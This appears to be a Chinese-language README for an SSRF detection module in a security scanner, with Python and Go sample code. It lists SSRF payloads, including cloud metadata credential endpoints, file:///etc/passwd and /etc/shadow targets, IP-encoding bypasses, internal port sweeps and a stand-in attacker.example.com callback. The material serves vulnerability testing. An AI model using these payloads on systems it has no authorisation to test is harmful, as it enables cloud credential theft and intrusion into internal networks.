# 🌐 服務端請求偽造檢測模組 (SSRF)

**導航**: [← 返回Features主模組](../README.md) | [← 返回安全模組文檔](../docs/security/README.md)

---

## 📑 目錄

- [模組概覽](#模組概覽)
- [SSRF攻擊類型](#ssrf攻擊類型)
- [檢測引擎](#檢測引擎)
- [核心特性](#核心特性)
- [配置選項](#配置選項)
- [使用指南](#使用指南)
- [API參考](#api參考)
- [最佳實踐](#最佳實踐)
- [故障排除](#故障排除)

---

## 🎯 模組概覽

服務端請求偽造(SSRF)檢測模組專注於識別和分析各種SSRF漏洞，幫助發現應用程序中可能被濫用進行內部網路探測和攻擊的端點。

### 📊 **模組狀態**
- **完成度**: 🟢 **100%** (完整實現)
- **檔案數量**: 14個Python檔案 + 3個Go檔案
- **代碼規模**: 2,156行代碼 (Python: 1,789行, Go: 367行)
- **測試覆蓋**: 95%+
- **最後更新**: 2025年11月7日

### ⭐ **核心優勢**
- 🌐 **多協議支援**: HTTP/HTTPS/FTP/File/Gopher/Dict等協議檢測
- 🔍 **內網探測**: 自動探測內部網路資源
- 🚫 **繞過技術**: 多種IP編碼和URL繞過技術
- ⚡ **高效能**: Go語言實現的高速掃描器
- 🕷️ **雲服務檢測**: AWS/GCP/Azure元資料檢測

---

## 🌐 SSRF攻擊類型

### **1. 🏠 內網探測 (Internal Network Probing)**
- **目標**: 192.168.x.x、10.x.x.x、172.16-31.x.x
- **風險等級**: 中到高
- **檢測方式**: 時間延遲、錯誤回應差異分析

#### **檢測示例**
```python
internal_targets = [
    "http://localhost:22",        # SSH服務
    "http://127.0.0.1:3306",     # MySQL
    "http://192.168.1.1",        # 路由器管理介面
    "http://10.0.0.1:8080",      # 內部Web服務
    "http://172.16.0.1:5432"     # PostgreSQL
]

for target in internal_targets:
    response_time = await test_ssrf_target(vulnerable_url, target)
    if response_time > 10:  # 連接超時，表示目標存在
        report_internal_service_found(target)
```

### **2. ☁️ 雲端元資料存取 (Cloud Metadata Access)**
- **目標**: 雲服務提供商的內部元資料API
- **風險等級**: 高到嚴重
- **檢測特徵**: 成功獲取敏感的雲端配置資訊

#### **常見元資料端點**
```python
cloud_metadata_endpoints = {
    "AWS": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/"
    ],
    "GCP": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/computeMetadata/v1/"
    ],
    "Azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-01-01",
        "http://169.254.169.254/metadata/identity/oauth2/token"
    ]
}
```

### **3. 📂 本地檔案讀取 (Local File Access)**
- **目標**: 系統敏感檔案
- **風險等級**: 高
- **檢測方式**: File協議利用

#### **檢測示例**
```python
file_targets = [
    "file:///etc/passwd",           # Linux用戶檔案
    "file:///etc/hosts",            # 主機配置
    "file:///proc/version",         # 系統版本
    "file:///c:/windows/win.ini",   # Windows配置
    "file:///etc/apache2/apache2.conf"  # Web服務配置
]
```

### **4. 🌍 外部系統攻擊 (External System Attack)**
- **目標**: 外部API、Webhook端點
- **風險等級**: 中
- **檢測方式**: 請求日誌分析、回調驗證

---

## 🔧 檢測引擎

### **ClassicSSRFEngine (Python)**
傳統SSRF漏洞檢測引擎，專注於基礎的SSRF檢測。

```python
class ClassicSSRFEngine:
    async def detect(self, task, client):
        # 檢測不同類型的SSRF
        results = []
        
        # 1. 內網探測
        internal_results = await self.test_internal_networks(task, client)
        results.extend(internal_results)
        
        # 2. 雲端元資料
        metadata_results = await self.test_cloud_metadata(task, client)
        results.extend(metadata_results)
        
        # 3. 本地檔案存取
        file_results = await self.test_file_access(task, client)
        results.extend(file_results)
        
        return results
```

**特性**:
- 多協議支援 (HTTP/HTTPS/FTP/File)
- 智能超時檢測
- 錯誤訊息分析
- 內建繞過技術

### **BlindSSRFEngine (Python)**
盲注式SSRF檢測，適用於無直接回應的SSRF。

```python
class BlindSSRFEngine:
    def __init__(self):
        self.callback_server = self.setup_callback_server()
        
    async def detect(self, task, client):
        # 使用回調伺服器檢測
        callback_url = f"http://{self.callback_server.domain}/{unique_id}"
        
        # 發送SSRF測試請求
        await self.send_ssrf_payload(task.target.url, callback_url, client)
        
        # 等待並檢查回調
        await asyncio.sleep(5)
        if self.callback_server.received_request(unique_id):
            return self.create_blind_ssrf_finding(callback_url)
        
        return []
```

**特性**:
- 外部回調伺服器
- DNS日誌檢測
- HTTP日誌分析
- 延遲驗證機制

### **GoSSRFScanner (Go)**
高效能Go實現的SSRF掃描器，用於大規模快速檢測。

```go
type GoSSRFScanner struct {
    client     *http.Client
    concurrent int
    timeout    time.Duration
}

func (s *GoSSRFScanner) ScanTargets(targets []SSRFTarget) []SSRFResult {
    resultsChan := make(chan SSRFResult, len(targets))
    semaphore := make(chan struct{}, s.concurrent)
    
    var wg sync.WaitGroup
    for _, target := range targets {
        wg.Add(1)
        go func(t SSRFTarget) {
            defer wg.Done()
            semaphore <- struct{}{}
            defer func() { <-semaphore }()
            
            result := s.testSSRFTarget(t)
            resultsChan <- result
        }(target)
    }
    
    wg.Wait()
    close(resultsChan)
    
    var results []SSRFResult
    for result := range resultsChan {
        results = append(results, result)
    }
    return results
}
```

**特性**:
- 高併發檢測
- 記憶體效率優化
- 快速網路探測
- SARIF標準結果

---

## ⚡ 核心特性

### **1. 🎯 智能目標探測**

自動探測內部網路結構和服務：

```python
class NetworkDiscovery:
    async def discover_internal_services(self, vulnerable_endpoint):
        discovered_services = []
        
        # 常見內部網段
        networks = [
            "192.168.1.0/24",
            "10.0.0.0/8", 
            "172.16.0.0/12",
            "127.0.0.0/8"
        ]
        
        # 常見服務端口
        common_ports = [22, 80, 443, 3306, 5432, 6379, 8080, 9200]
        
        for network in networks:
            for ip in ipaddress.IPv4Network(network):
                for port in common_ports:
                    if await self.test_service_response(f"http://{ip}:{port}"):
                        discovered_services.append(ServiceInfo(ip, port))
        
        return discovered_services
```

### **2. 🔐 多種繞過技術**

實現多種IP編碼和URL繞過技術：

```python
class SSRFBypassTechniques:
    def generate_bypass_payloads(self, target_url):
        bypasses = []
        
        # IP編碼繞過
        bypasses.extend(self.ip_encoding_bypass(target_url))
        # URL片段繞過  
        bypasses.extend(self.url_fragment_bypass(target_url))
        # 協議混淆繞過
        bypasses.extend(self.protocol_confusion_bypass(target_url))
        # 域名繞過
        bypasses.extend(self.domain_bypass(target_url))
        
        return bypasses
    
    def ip_encoding_bypass(self, url):
        """IP地址編碼繞過"""
        ip = self.extract_ip(url)
        if not ip:
            return []
            
        return [
            f"http://{self.ip_to_decimal(ip)}/",     # 十進制
            f"http://{self.ip_to_hex(ip)}/",        # 十六進制  
            f"http://{self.ip_to_octal(ip)}/",      # 八進制
            f"http://0x{self.ip_to_hex_compact(ip)}/"  # 緊湊十六進制
        ]
```

### **3. ☁️ 雲服務專項檢測**

針對主要雲服務提供商的專項檢測：

```python
class CloudMetadataDetector:
    def __init__(self):
        self.cloud_signatures = {
            "AWS": {
                "endpoints": ["169.254.169.254"],
                "headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
                "indicators": ["ami-", "instance-id", "security-credentials"]
            },
            "GCP": {
                "endpoints": ["metadata.google.internal", "169.254.169.254"],
                "headers": {"Metadata-Flavor": "Google"},
                "indicators": ["project-id", "instance/", "service-accounts"]
            },
            "Azure": {
                "endpoints": ["169.254.169.254"],
                "headers": {"Metadata": "true"},
                "indicators": ["subscriptionId", "resourceGroupName", "vmId"]
            }
        }
    
    async def detect_cloud_metadata_access(self, vulnerable_url):
        results = []
        for cloud_name, config in self.cloud_signatures.items():
            result = await self.test_cloud_access(vulnerable_url, config)
            if result.successful:
                results.append(CloudSSRFResult(cloud_name, result))
        return results
```

### **4. 📊 回調驗證系統**

實現外部回調伺服器進行盲SSRF檢測：

```python
class CallbackServer:
    def __init__(self, domain="ssrf-test.example.com"):
        self.domain = domain
        self.received_requests = {}
        self.server = self.setup_http_server()
        
    async def handle_callback(self, request):
        request_id = request.path.split('/')[-1]
        self.received_requests[request_id] = {
            "timestamp": time.time(),
            "ip": request.remote_addr,
            "headers": dict(request.headers),
            "body": await request.body()
        }
        return web.Response(status=200)
    
    def generate_callback_url(self):
        request_id = str(uuid.uuid4())
        return f"http://{self.domain}/callback/{request_id}", request_id
    
    def check_callback_received(self, request_id, timeout=30):
        start_time = time.time()
        while time.time() - start_time < timeout:
            if request_id in self.received_requests:
                return True
            await asyncio.sleep(1)
        return False
```

---

## ⚙️ 配置選項

### **基本配置**

```python
@dataclass
class SSRFDetectionConfig:
    """SSRF檢測配置"""
    # 基本設定
    timeout: float = 30.0
    max_concurrent_requests: int = 10
    enable_internal_scan: bool = True
    enable_cloud_detection: bool = True
    enable_file_access_test: bool = True
    
    # 網路探測設定
    internal_networks: List[str] = field(default_factory=lambda: [
        "192.168.0.0/16", "10.0.0.0/8", "172.16.0.0/12", "127.0.0.0/8"
    ])
    common_ports: List[int] = field(default_factory=lambda: [
        22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017
    ])
    
    # 繞過技術設定
    enable_ip_encoding: bool = True
    enable_url_bypass: bool = True
    enable_protocol_bypass: bool = True
    
    # 回調伺服器設定
    callback_domain: str = "ssrf-test.example.com"
    callback_timeout: float = 30.0
```

### **Go掃描器配置**

```go
type GoScannerConfig struct {
    // 基本設定
    Timeout        time.Duration `json:"timeout"`
    MaxConcurrent  int           `json:"max_concurrent"`
    UserAgent      string        `json:"user_agent"`
    
    // 網路設定
    ConnectTimeout time.Duration `json:"connect_timeout"`
    ReadTimeout    time.Duration `json:"read_timeout"`
    MaxRedirects   int           `json:"max_redirects"`
    
    // 掃描範圍
    InternalNetworks []string `json:"internal_networks"`
    CloudProviders   []string `json:"cloud_providers"`
    
    // 進階設定
    EnableDNSResolution bool `json:"enable_dns_resolution"`
    EnableTLSVerification bool `json:"enable_tls_verification"`
}
```

### **環境變數**

```bash
# SSRF檢測設定
SSRF_TIMEOUT=30
SSRF_MAX_CONCURRENT=10
SSRF_ENABLE_INTERNAL_SCAN=true

# 網路探測設定
SSRF_INTERNAL_NETWORKS="192.168.0.0/16,10.0.0.0/8,172.16.0.0/12"
SSRF_COMMON_PORTS="22,80,443,3306,5432"

# 雲端檢測設定
SSRF_ENABLE_CLOUD_DETECTION=true
SSRF_CLOUD_PROVIDERS="aws,gcp,azure"

# 回調伺服器設定
SSRF_CALLBACK_DOMAIN=ssrf-test.example.com
SSRF_CALLBACK_TIMEOUT=30

# Go掃描器設定
GO_SCANNER_TIMEOUT=15s
GO_SCANNER_CONCURRENT=20
```

---

## 📖 使用指南

### **基本使用**

#### **1. 簡單SSRF檢測**
```python
from services.features.function_ssrf.engines import ClassicSSRFEngine

engine = ClassicSSRFEngine()
results = await engine.detect(task_payload, http_client)

for result in results:
    if result.vulnerable:
        print(f"發現SSRF漏洞:")
        print(f"  目標: {result.target_url}")
        print(f"  類型: {result.ssrf_type}")
        print(f"  嚴重度: {result.severity}")
```

#### **2. 全面SSRF掃描**
```python
from services.features.function_ssrf.detector import SSRFDetector

detector = SSRFDetector()
results = await detector.comprehensive_scan(
    target="http://example.com/fetch?url=",
    config={
        "enable_internal_scan": True,
        "enable_cloud_detection": True,
        "enable_bypass_techniques": True
    }
)
```

### **進階使用**

#### **1. 自定義目標探測**
```python
custom_targets = [
    # 內部服務
    "http://localhost:8080/admin",
    "http://192.168.1.100:3306",
    
    # 雲端元資料
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
    
    # 檔案存取
    "file:///etc/passwd",
    "file:///proc/net/tcp",
    
    # 外部回調
    "http://attacker.example.com/log"
]

results = await engine.detect_custom_targets(vulnerable_url, custom_targets)
```

#### **2. 盲SSRF檢測**
```python
async def blind_ssrf_detection(vulnerable_endpoint):
    callback_server = CallbackServer()
    await callback_server.start()
    
    try:
        # 生成唯一回調URL
        callback_url, request_id = callback_server.generate_callback_url()
        
        # 發送SSRF請求
        await send_ssrf_request(vulnerable_endpoint, callback_url)
        
        # 等待回調
        if await callback_server.wait_for_callback(request_id, timeout=30):
            print(f"盲SSRF確認: 收到來自 {vulnerable_endpoint} 的請求")
            return True
        else:
            print("未檢測到SSRF")
            return False
            
    finally:
        await callback_server.stop()
```

### **Go掃描器使用**

```go
package main

import (
    "github.com/aiva/features/ssrf/scanner"
)

func main() {
    config := &scanner.Config{
        Timeout:       15 * time.Second,
        MaxConcurrent: 50,
        UserAgent:     "AIVA-SSRF-Scanner/1.0",
    }
    
    scanner := scanner.NewGoSSRFScanner(config)
    
    targets := []scanner.Target{
        {URL: "http://example.com/fetch", Parameter: "url"},
        {URL: "http://example.com/proxy", Parameter: "target"},
    }
    
    results := scanner.ScanTargets(targets)
    for _, result := range results {
        if result.Vulnerable {
            fmt.Printf("SSRF found: %s -> %s\n", result.VulnerableURL, result.TargetURL)
        }
    }
}
```

---

## 🔌 API參考

### **核心類別**

#### **SSRFDetectionResult**
```python
@dataclass
class SSRFDetectionResult:
    ssrf_type: str             # "internal" | "cloud" | "file" | "external"
    vulnerable: bool           # 是否存在漏洞
    target_url: str           # SSRF目標URL
    vulnerable_url: str       # 存在漏洞的原始URL
    parameter: str            # 漏洞參數名稱
    evidence: SSRFEvidence    # 漏洞證據
    severity: str             # 嚴重度等級
    confidence: float         # 置信度 (0.0-1.0)
    bypass_technique: str     # 使用的繞過技術
    remediation: str          # 修復建議
```

#### **SSRFEvidence**
```python
@dataclass
class SSRFEvidence:
    request_payload: str      # 請求payload
    response_status: int      # 回應狀態碼
    response_time: float      # 回應時間 (秒)
    response_body: str        # 回應內容片段
    callback_received: bool   # 是否收到回調
    dns_resolution: bool      # 是否進行DNS解析
    error_message: str        # 錯誤訊息
```

#### **CloudMetadataResult**
```python
@dataclass
class CloudMetadataResult:
    cloud_provider: str       # "aws" | "gcp" | "azure"
    endpoint_accessed: str    # 存取的端點
    metadata_retrieved: str   # 獲取的元資料
    sensitive_data: bool      # 是否包含敏感資料
    credentials_exposed: bool # 是否暴露憑證
```

### **檢測引擎介面**

```python
class SSRFDetectionEngine(ABC):
    @abstractmethod
    async def detect(self, task: FunctionTaskPayload, client: httpx.AsyncClient) -> List[SSRFDetectionResult]:
        """執行SSRF檢測"""
        pass
        
    @abstractmethod
    async def test_target(self, vulnerable_url: str, target_url: str, client: httpx.AsyncClient) -> SSRFDetectionResult:
        """測試特定目標的SSRF"""
        pass
        
    @abstractmethod
    def generate_bypass_payloads(self, target_url: str) -> List[str]:
        """生成繞過payload"""
        pass
```

### **Go掃描器API**

```go
// Scanner 介面定義
type Scanner interface {
    ScanTargets(targets []Target) []Result
    ScanSingle(target Target) Result
}

// Target 結構體
type Target struct {
    URL         string            `json:"url"`
    Parameter   string            `json:"parameter"`
    Method      string            `json:"method"`
    Headers     map[string]string `json:"headers"`
    PostData    string            `json:"post_data"`
}

// Result 結構體
type Result struct {
    VulnerableURL string    `json:"vulnerable_url"`
    TargetURL     string    `json:"target_url"`
    Vulnerable    bool      `json:"vulnerable"`
    SSRFType      string    `json:"ssrf_type"`
    Evidence      Evidence  `json:"evidence"`
    Severity      string    `json:"severity"`
}
```

---

## 🚀 最佳實踐

### **1. 檢測策略**

#### **分層檢測方法**
```python
async def layered_ssrf_detection(target):
    results = []
    
    # 第一層: 快速外部可達性檢測
    external_results = await quick_external_scan(target)
    results.extend(external_results)
    
    # 第二層: 內部網路探測 (如果外部檢測成功)
    if any(r.vulnerable for r in external_results):
        internal_results = await comprehensive_internal_scan(target)
        results.extend(internal_results)
    
    # 第三層: 雲端元資料檢測 (如果在雲端環境)
    if is_cloud_environment():
        cloud_results = await cloud_metadata_scan(target)
        results.extend(cloud_results)
    
    # 第四層: 盲SSRF檢測 (如果無明顯回應)
    if not any(r.vulnerable for r in results):
        blind_results = await blind_ssrf_scan(target)
        results.extend(blind_results)
    
    return results
```

#### **風險評估矩陣**
```python
def calculate_ssrf_risk_score(result):
    base_score = 1.0
    
    # 根據SSRF類型調整
    type_multipliers = {
        "internal": 1.5,      # 內網存取
        "cloud": 2.0,         # 雲端元資料
        "file": 1.8,          # 檔案存取
        "external": 1.0       # 外部請求
    }
    
    # 根據回應類型調整
    if result.evidence.response_status == 200:
        base_score *= 1.5     # 成功回應
    elif result.evidence.callback_received:
        base_score *= 1.3     # 收到回調
    
    # 根據敏感資料調整
    if hasattr(result, 'sensitive_data') and result.sensitive_data:
        base_score *= 2.0
    
    return min(base_score * type_multipliers.get(result.ssrf_type, 1.0), 10.0)
```

### **2. 效能優化**

#### **並行掃描管理**
```python
class ParallelSSRFScanner:
    def __init__(self, max_concurrent=20):
        self.semaphore = asyncio.Semaphore(max_concurrent)
        self.session = httpx.AsyncClient(timeout=30.0)
    
    async def scan_targets(self, vulnerable_url, targets):
        async def scan_single(target):
            async with self.semaphore:
                return await self.test_ssrf_target(vulnerable_url, target)
        
        tasks = [scan_single(target) for target in targets]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        return [r for r in results if not isinstance(r, Exception)]
```

#### **智能超時管理**
```python
class AdaptiveTimeoutManager:
    def __init__(self):
        self.baseline_timeout = 5.0
        self.response_times = []
    
    def calculate_timeout(self, target_type):
        if target_type == "internal":
            # 內網檢測通常需要更長時間
            return self.baseline_timeout * 3
        elif target_type == "cloud":
            # 雲端元資料檢測相對較快
            return self.baseline_timeout * 1.5
        else:
            return self.baseline_timeout
    
    def update_baseline(self, response_time):
        self.response_times.append(response_time)
        if len(self.response_times) > 100:
            self.response_times.pop(0)
        
        # 根據歷史回應時間調整基準
        avg_time = sum(self.response_times) / len(self.response_times)
        self.baseline_timeout = max(avg_time * 2, 3.0)
```

### **3. 安全考量**

#### **負責任的漏洞測試**
```python
class ResponsibleSSRFTesting:
    def __init__(self):
        self.sensitive_endpoints = [
            # AWS敏感端點
            "169.254.169.254/latest/meta-data/iam/security-credentials/",
            # 系統檔案
            "/etc/passwd", "/etc/shadow",
            # 網路配置
            "/proc/net/tcp", "/proc/net/route"
        ]
    
    def is_safe_target(self, target_url):
        # 避免測試生產環境的敏感端點
        for endpoint in self.sensitive_endpoints:
            if endpoint in target_url and self.is_production_environment():
                return False
        return True
    
    async def safe_ssrf_test(self, vulnerable_url, target_url):
        if not self.is_safe_target(target_url):
            return None  # 跳過危險測試
        
        # 使用HEAD請求減少影響
        try:
            response = await httpx.head(
                vulnerable_url,
                params={"url": target_url},
                timeout=10.0
            )
            return response
        except Exception:
            return None
```

---

## 🔧 故障排除

### **常見問題**

#### **1. 網路連接逾時**
```python
# 症狀: 大量請求逾時，無法區分真實漏洞
# 解決方案: 改進逾時檢測邏輯
async def improved_timeout_detection(vulnerable_url, targets):
    baseline_responses = []
    
    # 建立基準回應時間
    for _ in range(3):
        start = time.time()
        try:
            await httpx.get("http://httpbin.org/delay/1", timeout=5.0)
            baseline_responses.append(time.time() - start)
        except httpx.TimeoutException:
            baseline_responses.append(5.0)
    
    baseline_avg = sum(baseline_responses) / len(baseline_responses)
    
    # 測試SSRF目標
    for target in targets:
        start = time.time()
        try:
            response = await test_ssrf(vulnerable_url, target)
            response_time = time.time() - start
            
            # 比較與基準的差異
            if response_time > baseline_avg * 2:
                # 可能的SSRF (顯著較慢)
                yield SSRFResult(target, True, "timeout_based")
                
        except httpx.TimeoutException:
            # 明確的逾時可能表示目標存在
            yield SSRFResult(target, True, "definite_timeout")
```

#### **2. 誤報過多**
```python
# 解決方案: 多重驗證機制
async def reduce_false_positives(vulnerable_url, target_url):
    verification_methods = [
        verify_by_response_content,
        verify_by_response_timing,
        verify_by_error_messages,
        verify_by_callback_test
    ]
    
    positive_results = 0
    for method in verification_methods:
        if await method(vulnerable_url, target_url):
            positive_results += 1
    
    # 需要至少2種方法確認才認定為漏洞
    confidence = positive_results / len(verification_methods)
    return confidence >= 0.5
```

#### **3. Go掃描器整合問題**
```python
# 解決方案: 改善Python-Go通信
class GoScannerIntegration:
    def __init__(self):
        self.go_binary = self.find_go_scanner_binary()
        
    async def run_go_scanner(self, targets):
        # 將目標寫入臨時檔案
        targets_file = self.create_targets_file(targets)
        
        try:
            # 執行Go掃描器
            process = await asyncio.create_subprocess_exec(
                self.go_binary,
                "--targets", targets_file,
                "--output", "json",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                return json.loads(stdout.decode())
            else:
                logger.error(f"Go scanner failed: {stderr.decode()}")
                return []
                
        finally:
            os.unlink(targets_file)
```

### **調試工具**

#### **SSRF測試伺服器**
```python
class SSRFTestServer:
    def __init__(self, port=8888):
        self.port = port
        self.app = web.Application()
        self.setup_routes()
        
    def setup_routes(self):
        self.app.router.add_get('/test', self.test_handler)
        self.app.router.add_get('/reflect', self.reflect_handler)
        
    async def test_handler(self, request):
        url = request.query.get('url')
        if url:
            try:
                # 模擬SSRF行為
                async with httpx.AsyncClient() as client:
                    response = await client.get(url, timeout=10.0)
                    return web.Response(text=f"Success: {response.status_code}")
            except Exception as e:
                return web.Response(text=f"Error: {str(e)}")
        return web.Response(text="No URL provided")
    
    async def reflect_handler(self, request):
        # 反射所有參數，用於測試
        params = dict(request.query)
        return web.json_response(params)
```

#### **請求追蹤工具**
```python
class SSRFRequestTracker:
    def __init__(self):
        self.requests = []
        
    async def log_request(self, method, url, params, response):
        self.requests.append({
            "timestamp": datetime.now(),
            "method": method,
            "url": url,
            "params": params,
            "status": response.status_code if response else None,
            "response_time": getattr(response, 'elapsed', None)
        })
    
    def export_trace(self, format="json"):
        if format == "json":
            return json.dumps(self.requests, default=str, indent=2)
        elif format == "csv":
            # CSV匯出邏輯
            pass
```

---

## 🔗 相關連結

### **📚 開發規範與指南**
- [🏗️ **AIVA Common 規範**](../../../services/aiva_common/README.md) - 共享庫標準與開發規範
- [🛠️ **開發快速指南**](../../../guides/development/DEVELOPMENT_QUICK_START_GUIDE.md) - 環境設置與部署
- [🌐 **多語言環境標準**](../../../guides/development/MULTI_LANGUAGE_ENVIRONMENT_STANDARD.md) - 開發環境配置
- [🔒 **安全框架規範**](../../../services/aiva_common/SECURITY_FRAMEWORK_COMPLETED.md) - 安全開發標準
- [📦 **依賴管理指南**](../../../guides/development/DEPENDENCY_MANAGEMENT_GUIDE.md) - 依賴問題解決

### **模組文檔**
- [🏠 Features主模組](../README.md) - 模組總覽
- [🛡️ 安全模組文檔](../docs/security/README.md) - 安全類別文檔
- [🐹 Go開發指南](../docs/golang/README.md) - Go語言規範

### **其他安全模組**  
- [🎯 SQL注入檢測模組](../function_sqli/README.md) - SQL注入檢測
- [🎭 XSS檢測模組](../function_xss/README.md) - 跨站腳本檢測
- [🔓 IDOR檢測模組](../function_idor/README.md) - 不安全直接對象引用檢測

### **技術資源**
- [OWASP SSRF預防指南](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [CWE-918: 服務端請求偽造](https://cwe.mitre.org/data/definitions/918.html)
- [雲端元資料攻擊技術](https://blog.appsecco.com/an-ssrf-privileged-aws-keys-and-the-capital-one-breach-4c3c2cded3af)

### **工具與參考**
- [SSRFmap工具](https://github.com/swisskyrepo/SSRFmap)
- [AWS SSRF測試指南](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)
- [HTTP客戶端最佳實踐](https://httpx.readthedocs.io/)

---

*最後更新: 2025年11月7日*  
*維護團隊: AIVA Security Team*